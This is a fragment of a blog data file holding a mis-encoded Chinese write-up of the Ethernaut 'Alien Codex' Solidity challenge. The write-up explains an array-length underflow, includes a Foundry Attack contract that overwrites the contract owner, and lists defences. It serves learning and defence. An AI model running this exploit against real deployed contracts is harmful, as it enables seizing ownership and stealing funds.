¸å¿ƒå‡½æ•°ï¼Œå®ƒåœ¨ç¡®å®šå­˜å‚¨ä½ç½®æ—¶æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚\n-   **Foundry `unchecked`**: åœ¨Solidity `^0.8.0` ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ `unchecked` å—æ¥æ•…æ„å…è®¸æº¢å‡ºï¼Œè¿™åœ¨å¤ç°æ—§ç‰ˆæœ¬æ¼æ´æˆ–è¿›è¡Œç‰¹å®šä½æ“ä½œæ—¶å¾ˆæœ‰ç”¨ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   æ—§ç‰ˆSolidityï¼ˆ<0.8.0ï¼‰çš„æ•´æ•°è¿ç®—é»˜è®¤ä¸æ£€æŸ¥æº¢å‡ºã€‚\n-   åŠ¨æ€æ•°ç»„çš„é•¿åº¦å¯ä»¥è¢«æ“çºµï¼Œä»¥è®¿é—®åˆçº¦çš„æ•´ä¸ª256ä½å­˜å‚¨ç©ºé—´ã€‚\n-   åˆçº¦çš„å­˜å‚¨æ§½ä½å¯ä»¥é€šè¿‡ `keccak256` å“ˆå¸Œè¿›è¡Œç¡®å®šæ€§è®¡ç®—ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡æ•´æ•°ä¸‹æº¢ä¸€ä¸ªåŠ¨æ€æ•°ç»„çš„é•¿åº¦ï¼Œè·å¾—å¯¹åˆçº¦ä»»æ„å­˜å‚¨ä½ç½®çš„å†™æƒé™ã€‚\n-   è®¡ç®—å‡ºæŒ‡å‘ `owner` å˜é‡æ‰€åœ¨å­˜å‚¨æ§½ï¼ˆslot 0ï¼‰çš„æ•°ç»„ç´¢å¼•ã€‚\n-   è°ƒç”¨æ•°ç»„çš„å†™å‡½æ•°ï¼ˆ`revise`ï¼‰æ¥è¦†ç›– `owner`ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å§‹ç»ˆä½¿ç”¨æœ€æ–°çš„ã€å®‰å…¨çš„Solidityç‰ˆæœ¬ã€‚\n-   å¦‚æœä½¿ç”¨æ—§ç‰ˆæœ¬ï¼Œå¿…é¡»ä½¿ç”¨ `SafeMath`ã€‚\n-   å¯¹æ‰€æœ‰å¤–éƒ¨è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å½±å“çŠ¶æ€å˜é‡ï¼ˆå¦‚æ•°ç»„é•¿åº¦ï¼‰çš„è¾“å…¥ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: Mapping and Dynamic Arrays](https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays)\n-   [Consensys: Integer Overflow and Underflow](https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/)","slug":"ethernaut-level-19-alien-codex","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbph001fbf5q4cm5anjz","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-19-Alien-Codex-åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\"><a href=\"#ğŸ¯-Ethernaut-Level-19-Alien-Codex-åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\"></a>ğŸ¯ Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/19\">Ethernaut Level 19 - Alien Codex</a><br><strong>æ”»å‡»ç±»å‹</strong>: å­˜å‚¨æ“çºµ &#x2F; æ•´æ•°ä¸‹æº¢<br><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯è·å– <code>AlienCodex</code> åˆçº¦çš„æ‰€æœ‰æƒã€‚è¿™æ˜¯ä¸€ä¸ªç»§æ‰¿äº† <code>Ownable</code> çš„åˆçº¦ï¼Œ<code>owner</code> å­˜å‚¨åœ¨ slot 0ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg\" alt=\"Alien Codex Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>AlienCodex</code> åˆçº¦ä½¿ç”¨äº†ä¸€ä¸ªæ—§çš„ Solidity ç‰ˆæœ¬ (<code>^0.5.0</code>)ï¼Œè¿™æ„å‘³ç€æ•´æ•°æ“ä½œä¸ä¼šè¿›è¡Œæº¢å‡ºæ£€æŸ¥ã€‚è¿™æ˜¯æœ¬å…³çš„æ ¸å¿ƒæ¼æ´ã€‚åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\">å˜é‡å</th>\n<th align=\"left\">ç±»å‹</th>\n<th align=\"left\">è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>contact</code></td>\n<td align=\"left\"><code>bool</code></td>\n<td align=\"left\">ä¸ <code>owner</code> æ‰“åŒ…åœ¨åŒä¸€ä¸ªæ§½ä½</td>\n</tr>\n<tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>owner</code></td>\n<td align=\"left\"><code>address</code></td>\n<td align=\"left\">ç»§æ‰¿è‡ª <code>Ownable</code>ï¼Œä½äº slot 0</td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>codex</code></td>\n<td align=\"left\"><code>bytes32[]</code></td>\n<td align=\"left\">åŠ¨æ€æ•°ç»„ï¼Œslot 1 å­˜å‚¨å…¶é•¿åº¦</td>\n</tr>\n</tbody></table>\n<p>åˆçº¦ä¸­çš„å‡½æ•°éƒ½å—åˆ° <code>contacted</code> ä¿®é¥°ç¬¦çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆè°ƒç”¨ <code>makeContact()</code> å°† <code>contact</code> è®¾ç½®ä¸º <code>true</code>ã€‚</p>\n<p>å…³é”®æ¼æ´åœ¨ <code>retract()</code> å‡½æ•°ä¸­ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// From AlienCodex.sol (Solidity v0.5.0)</span><br><span class=\"line\">function retract() public contacted &#123;</span><br><span class=\"line\">    codex.length--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ç”±äºæ²¡æœ‰æº¢å‡ºæ£€æŸ¥ï¼Œå¦‚æœ <code>codex.length</code> ä¸º0ï¼Œæ‰§è¡Œ <code>codex.length--</code> ä¼šå¯¼è‡´æ•´æ•°ä¸‹æº¢ï¼Œä½¿å…¶é•¿åº¦å˜ä¸º <code>2**256 - 1</code>ã€‚ä¸€ä¸ªé•¿åº¦ä¸º <code>2**256 - 1</code> çš„åŠ¨æ€æ•°ç»„å¯ä»¥è¦†ç›–æ•´ä¸ªåˆçº¦çš„å­˜å‚¨ç©ºé—´ï¼</p>\n<p>æ‹¥æœ‰ä¸€ä¸ªå¯ä»¥å†™åˆ°ä»»æ„å­˜å‚¨ä½ç½®çš„æ•°ç»„åï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¦†ç›– slot 0 ä¸­çš„ <code>owner</code> å˜é‡ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å“ªä¸ªæ•°ç»„ç´¢å¼• <code>i</code> å¯¹åº”äºå­˜å‚¨æ§½ <code>0</code>ã€‚</p>\n<p>åŠ¨æ€æ•°ç»„çš„æ•°æ®å­˜å‚¨ä½ç½®æ˜¯ä» <code>keccak256(p)</code> å¼€å§‹çš„ï¼Œå…¶ä¸­ <code>p</code> æ˜¯æ•°ç»„é•¿åº¦æ‰€åœ¨çš„æ§½ä½ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œ<code>codex</code> çš„é•¿åº¦å­˜å‚¨åœ¨ slot 1ï¼Œæ‰€ä»¥å®ƒçš„æ•°æ®èµ·å§‹ä½ç½®æ˜¯ <code>keccak256(1)</code>ã€‚</p>\n<ul>\n<li><code>codex[0]</code> å­˜å‚¨åœ¨ <code>keccak256(1)</code></li>\n<li><code>codex[i]</code> å­˜å‚¨åœ¨ <code>keccak256(1) + i</code></li>\n</ul>\n<p>æˆ‘ä»¬æƒ³å†™å…¥çš„ä½ç½®æ˜¯ slot 0ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç´¢å¼• <code>i</code>ï¼Œä½¿å¾— <code>keccak256(1) + i</code> åœ¨ <code>2**256</code> çš„æ¨¡è¿ç®—ä¸‹ç­‰äº <code>0</code>ã€‚</p>\n<p><code>keccak256(1) + i = 2**256</code><br><code>i = 2**256 - keccak256(1)</code></p>\n<p>ä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡ºè¿™ä¸ªç´¢å¼• <code>i</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ <code>revise(i, our_address)</code> æ¥å°† <code>owner</code> ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦å°†æ‰§è¡Œä¸Šè¿°çš„ä¸‰ä¸ªæ­¥éª¤ï¼šå»ºç«‹è”ç³»ã€è§¦å‘ä¸‹æº¢ã€è®¡ç®—ç´¢å¼•å¹¶ä¿®æ”¹ <code>owner</code>ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/19_AlienCodex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract AlienCodexTest is Test &#123;</span><br><span class=\"line\">    AlienCodex instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new AlienCodex();</span><br><span class=\"line\">        assertNotEq(instance.owner(), player);</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    AlienCodex public instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        instance = AlienCodex(_instanceAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // 1. æˆä¸ºè”ç³»äººï¼Œç»•è¿‡ modifier</span><br><span class=\"line\">        instance.makeContact();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. è°ƒç”¨ retract() è§¦å‘æ•°ç»„é•¿åº¦ä¸‹æº¢</span><br><span class=\"line\">        instance.retract();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. è®¡ç®—è¦†ç›– slot 0 æ‰€éœ€çš„ç´¢å¼•</span><br><span class=\"line\">        uint256 slot0_index;</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. è°ƒç”¨ revise() å°† owner ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„åœ°å€</span><br><span class=\"line\">        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è°ƒç”¨ <code>makeContact()</code></strong>: è§£é™¤å¯¹å…¶ä»–å‡½æ•°çš„è°ƒç”¨é™åˆ¶ã€‚</li>\n<li><strong>è°ƒç”¨ <code>retract()</code></strong>: åœ¨ <code>codex</code> æ•°ç»„ä¸ºç©ºæ—¶è°ƒç”¨ï¼Œåˆ©ç”¨æ•´æ•°ä¸‹æº¢å°†æ•°ç»„é•¿åº¦å˜ä¸º <code>type(uint256).max</code>ã€‚</li>\n<li><strong>è®¡ç®—ç›®æ ‡ç´¢å¼•</strong>: è®¡ç®—å‡ºèƒ½è®©æ•°ç»„è®¿é—®â€œç¯ç»•â€åˆ°å­˜å‚¨æ§½0çš„ç´¢å¼• <code>i = 2**256 - keccak256(1)</code>ã€‚</li>\n<li><strong>è°ƒç”¨ <code>revise()</code></strong>: ä½¿ç”¨è®¡ç®—å‡ºçš„ç´¢å¼•å’Œ <code>player</code> çš„åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨ <code>revise</code>ï¼Œè¿™ä¼šè¦†ç›– slot 0 çš„å†…å®¹ï¼Œä»è€Œæ”¹å˜ <code>owner</code>ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>ä½¿ç”¨å®‰å…¨çš„Solidityç‰ˆæœ¬</strong>: ä» <code>0.8.0</code> ç‰ˆæœ¬å¼€å§‹ï¼ŒSolidity é»˜è®¤ä¼šå¯¹æ‰€æœ‰ç®—æœ¯è¿ç®—è¿›è¡Œä¸Šæº¢å’Œä¸‹æº¢æ£€æŸ¥ã€‚è¿™æ˜¯é˜²æ­¢æ­¤ç±»æ¼æ´æœ€ç®€å•ã€æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚</li>\n<li><strong>ä½¿ç”¨ <code>SafeMath</code> åº“</strong>: å¦‚æœå¿…é¡»ä½¿ç”¨æ—§ç‰ˆæœ¬çš„Solidityï¼Œåº”å§‹ç»ˆä½¿ç”¨ <code>SafeMath</code> æˆ–ç±»ä¼¼çš„åº“æ¥æ‰§è¡Œæ‰€æœ‰ç®—æœ¯è¿ç®—ï¼Œä»¥é˜²æ­¢æº¢å‡ºã€‚</li>\n<li><strong>è°¨æ…å¤„ç†åŠ¨æ€æ•°ç»„</strong>: åŠ¨æ€æ•°ç»„çš„å­˜å‚¨ç®¡ç†å¾ˆå¤æ‚ã€‚åº”é¿å…å…è®¸ç”¨æˆ·ç›´æ¥æ§åˆ¶å¯èƒ½å¯¼è‡´å­˜å‚¨å†²çªçš„æ“ä½œï¼Œå¦‚æ— é™åˆ¶åœ°å¢åŠ æˆ–å‡å°‘æ•°ç»„é•¿åº¦ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>æ•´æ•°æº¢å‡º (Overflow&#x2F;Underflow)</strong>: åœ¨æ—§ç‰ˆæœ¬Solidityä¸­ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚å½“ä¸€ä¸ªæ•´æ•°å˜é‡å¢åŠ è¶…è¿‡å…¶æœ€å¤§å€¼ï¼ˆä¸Šæº¢ï¼‰æˆ–å‡å°‘åˆ°å°äºå…¶æœ€å°å€¼ï¼ˆä¸‹æº¢ï¼‰æ—¶å‘ç”Ÿã€‚</li>\n<li><strong>åŠ¨æ€æ•°ç»„çš„å­˜å‚¨å¸ƒå±€</strong>: ç†è§£åŠ¨æ€æ•°ç»„çš„é•¿åº¦å’Œæ•°æ®æ˜¯å¦‚ä½•åœ¨å­˜å‚¨ä¸­å¸ƒå±€çš„ï¼Œæ˜¯å‘ç°å’Œåˆ©ç”¨å­˜å‚¨æ“çºµæ¼æ´çš„å…³é”®ã€‚</li>\n<li><strong><code>keccak256</code></strong>: EVMä¸­ç”¨äºè®¡ç®—å“ˆå¸Œçš„æ ¸å¿ƒå‡½æ•°ï¼Œå®ƒåœ¨ç¡®å®šå­˜å‚¨ä½ç½®æ—¶æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚</li>\n<li><strong>Foundry <code>unchecked</code></strong>: åœ¨Solidity <code>^0.8.0</code> ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ <code>unchecked</code> å—æ¥æ•…æ„å…è®¸æº¢å‡ºï¼Œè¿™åœ¨å¤ç°æ—§ç‰ˆæœ¬æ¼æ´æˆ–è¿›è¡Œç‰¹å®šä½æ“ä½œæ—¶å¾ˆæœ‰ç”¨ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>æ—§ç‰ˆSolidityï¼ˆ&lt;0.8.0ï¼‰çš„æ•´æ•°è¿ç®—é»˜è®¤ä¸æ£€æŸ¥æº¢å‡ºã€‚</li>\n<li>åŠ¨æ€æ•°ç»„çš„é•¿åº¦å¯ä»¥è¢«æ“çºµï¼Œä»¥è®¿é—®åˆçº¦çš„æ•´ä¸ª256ä½å­˜å‚¨ç©ºé—´ã€‚</li>\n<li>åˆçº¦çš„å­˜å‚¨æ§½ä½å¯ä»¥é€šè¿‡ <code>keccak256</code> å“ˆå¸Œè¿›è¡Œç¡®å®šæ€§è®¡ç®—ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡æ•´æ•°ä¸‹æº¢ä¸€ä¸ªåŠ¨æ€æ•°ç»„çš„é•¿åº¦ï¼Œè·å¾—å¯¹åˆçº¦ä»»æ„å­˜å‚¨ä½ç½®çš„å†™æƒé™ã€‚</li>\n<li>è®¡ç®—å‡ºæŒ‡å‘ <code>owner</code> å˜é‡æ‰€åœ¨å­˜å‚¨æ§½ï¼ˆslot 0ï¼‰çš„æ•°ç»„ç´¢å¼•ã€‚</li>\n<li>è°ƒç”¨æ•°ç»„çš„å†™å‡½æ•°ï¼ˆ<code>revise</code>ï¼‰æ¥è¦†ç›– <code>owner</code>ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å§‹ç»ˆä½¿ç”¨æœ€æ–°çš„ã€å®‰å…¨çš„Solidityç‰ˆæœ¬ã€‚</li>\n<li>å¦‚æœä½¿ç”¨æ—§ç‰ˆæœ¬ï¼Œå¿…é¡»ä½¿ç”¨ <code>SafeMath</code>ã€‚</li>\n<li>å¯¹æ‰€æœ‰å¤–éƒ¨è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å½±å“çŠ¶æ€å˜é‡ï¼ˆå¦‚æ•°ç»„é•¿åº¦ï¼‰çš„è¾“å…¥ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays\">Solidity Docs: Mapping and Dynamic Arrays</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/\">Consensys: Integer Overflow and Underflow</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-19-Alien-Codex-åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\"><a href=\"#ğŸ¯-Ethernaut-Level-19-Alien-Codex-åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\"></a>ğŸ¯ Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/19\">Ethernaut Level 19 - Alien Codex</a><br><strong>æ”»å‡»ç±»å‹</strong>: å­˜å‚¨æ“çºµ &#x2F; æ•´æ•°ä¸‹æº¢<br><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯è·å– <code>AlienCodex</code> åˆçº¦çš„æ‰€æœ‰æƒã€‚è¿™æ˜¯ä¸€ä¸ªç»§æ‰¿äº† <code>Ownable</code> çš„åˆçº¦ï¼Œ<code>owner</code> å­˜å‚¨åœ¨ slot 0ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg\" alt=\"Alien Codex Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>AlienCodex</code> åˆçº¦ä½¿ç”¨äº†ä¸€ä¸ªæ—§çš„ Solidity ç‰ˆæœ¬ (<code>^0.5.0</code>)ï¼Œè¿™æ„å‘³ç€æ•´æ•°æ“ä½œä¸ä¼šè¿›è¡Œæº¢å‡ºæ£€æŸ¥ã€‚è¿™æ˜¯æœ¬å…³çš„æ ¸å¿ƒæ¼æ´ã€‚åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\">å˜é‡å</th>\n<th align=\"left\">ç±»å‹</th>\n<th align=\"left\">è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>contact</code></td>\n<td align=\"left\"><code>bool</code></td>\n<td align=\"left\">ä¸ <code>owner</code> æ‰“åŒ…åœ¨åŒä¸€ä¸ªæ§½ä½</td>\n</tr>\n<tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>owner</code></td>\n<td align=\"left\"><code>address</code></td>\n<td align=\"left\">ç»§æ‰¿è‡ª <code>Ownable</code>ï¼Œä½äº slot 0</td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>codex</code></td>\n<td align=\"left\"><code>bytes32[]</code></td>\n<td align=\"left\">åŠ¨æ€æ•°ç»„ï¼Œslot 1 å­˜å‚¨å…¶é•¿åº¦</td>\n</tr>\n</tbody></table>\n<p>åˆçº¦ä¸­çš„å‡½æ•°éƒ½å—åˆ° <code>contacted</code> ä¿®é¥°ç¬¦çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆè°ƒç”¨ <code>makeContact()</code> å°† <code>contact</code> è®¾ç½®ä¸º <code>true</code>ã€‚</p>\n<p>å…³é”®æ¼æ´åœ¨ <code>retract()</code> å‡½æ•°ä¸­ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// From AlienCodex.sol (Solidity v0.5.0)</span><br><span class=\"line\">function retract() public contacted &#123;</span><br><span class=\"line\">    codex.length--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ç”±äºæ²¡æœ‰æº¢å‡ºæ£€æŸ¥ï¼Œå¦‚æœ <code>codex.length</code> ä¸º0ï¼Œæ‰§è¡Œ <code>codex.length--</code> ä¼šå¯¼è‡´æ•´æ•°ä¸‹æº¢ï¼Œä½¿å…¶é•¿åº¦å˜ä¸º <code>2**256 - 1</code>ã€‚ä¸€ä¸ªé•¿åº¦ä¸º <code>2**256 - 1</code> çš„åŠ¨æ€æ•°ç»„å¯ä»¥è¦†ç›–æ•´ä¸ªåˆçº¦çš„å­˜å‚¨ç©ºé—´ï¼</p>\n<p>æ‹¥æœ‰ä¸€ä¸ªå¯ä»¥å†™åˆ°ä»»æ„å­˜å‚¨ä½ç½®çš„æ•°ç»„åï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¦†ç›– slot 0 ä¸­çš„ <code>owner</code> å˜é‡ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å“ªä¸ªæ•°ç»„ç´¢å¼• <code>i</code> å¯¹åº”äºå­˜å‚¨æ§½ <code>0</code>ã€‚</p>\n<p>åŠ¨æ€æ•°ç»„çš„æ•°æ®å­˜å‚¨ä½ç½®æ˜¯ä» <code>keccak256(p)</code> å¼€å§‹çš„ï¼Œå…¶ä¸­ <code>p</code> æ˜¯æ•°ç»„é•¿åº¦æ‰€åœ¨çš„æ§½ä½ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œ<code>codex</code> çš„é•¿åº¦å­˜å‚¨åœ¨ slot 1ï¼Œæ‰€ä»¥å®ƒçš„æ•°æ®èµ·å§‹ä½ç½®æ˜¯ <code>keccak256(1)</code>ã€‚</p>\n<ul>\n<li><code>codex[0]</code> å­˜å‚¨åœ¨ <code>keccak256(1)</code></li>\n<li><code>codex[i]</code> å­˜å‚¨åœ¨ <code>keccak256(1) + i</code></li>\n</ul>\n<p>æˆ‘ä»¬æƒ³å†™å…¥çš„ä½ç½®æ˜¯ slot 0ã€‚å› 